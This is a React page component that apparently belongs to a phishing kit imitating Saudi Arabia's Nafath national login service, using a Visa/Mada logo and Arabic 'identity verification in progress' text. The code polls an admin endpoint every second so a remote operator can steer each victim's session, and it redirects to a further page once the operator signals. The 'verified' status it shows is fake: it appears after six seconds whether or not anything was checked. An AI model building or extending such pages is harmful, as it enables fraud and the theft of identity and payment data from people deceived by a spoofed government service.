import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { getControlAction } from "@/lib/api";
import { Header } from "@/components/layout/Header";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function IdentityCheck() {
  const [, setLocation] = useLocation();
  const [showSpinner, setShowSpinner] = useState(true);
  const [adminCode, setAdminCode] = useState<string | null>(null);
  const [fadeOut, setFadeOut] = useState(false);
  
  const sessionId = localStorage.getItem("sessionId");
  
  // Check for control messages from admin
  const { data: controlData } = useQuery({
    queryKey: ["control", sessionId],
    queryFn: () => getControlAction(sessionId!),
    refetchInterval: 1000,
    enabled: !!sessionId,
  });

  // Handle admin control
  useEffect(() => {
    if (!controlData) return;
    
    if (controlData.action === "identity_code") {
      // Admin sent a code - hide spinner and show the code
      setAdminCode("verified");
      setShowSpinner(false);
      setFadeOut(true);
      
      // Redirect after showing verified
      setTimeout(() => {
        setLocation("/nomer");
      }, 2000);
    }
  }, [controlData, setLocation]);

  // Auto-hide spinner after 6 seconds if no admin code
  useEffect(() => {
    if (showSpinner && !adminCode) {
      const timer = setTimeout(() => {
        setFadeOut(true);
        setTimeout(() => {
          setShowSpinner(false);
          setFadeOut(false);
        }, 500);
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [showSpinner, adminCode]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-8 object-contain" />
          
          {/* Spinner or Verified */}
          <div className="mb-8">
            <AnimatePresence mode="wait">
              {showSpinner ? (
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: fadeOut ? 0 : 1, scale: fadeOut ? 0.8 : 1 }}
                  exit={{ opacity: 0, scale: 0.8 }}
                  transition={{ duration: 0.5 }}
                  className="flex flex-col items-center"
                >
                  <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
                </motion.div>
              ) : (
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="flex flex-col items-center"
                >
                  <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
                    <span className="text-4xl">✓</span>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Message */}
          <h2 className="text-xl font-bold text-gray-800 mb-4">
            {showSpinner ? "جارٍ التحقق من الهوية..." : "تم التحقق بنجاح"}
          </h2>
          
          <p className="text-gray-600 leading-relaxed">
            يرجى الانتظار وعدم إغلاق الصفحة
            <br />
            يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
          </p>

        </div>
      </div>

      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
